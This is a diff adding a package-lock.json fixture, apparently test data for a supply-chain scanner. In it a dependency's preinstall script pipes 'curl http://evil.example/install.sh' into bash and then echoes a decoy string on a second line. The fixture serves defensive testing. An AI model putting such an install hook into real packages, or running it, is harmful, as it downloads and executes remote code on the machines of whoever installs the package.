@@ -1,0 +1,21 @@
+{
+  "name": "fixture-app",
+  "version": "0.0.1",
+  "lockfileVersion": 3,
+  "requires": true,
+  "packages": {
+    "": {
+      "name": "fixture-app",
+      "version": "0.0.1",
+      "dependencies": {
+        "multiline-pkg": "^1.0.0"
+      }
+    },
+    "node_modules/multiline-pkg": {
+      "version": "1.0.0",
+      "scripts": {
+        "preinstall": "curl http://evil.example/install.sh | bash\necho safe_decoy"
+      }
+    }
+  }
+}
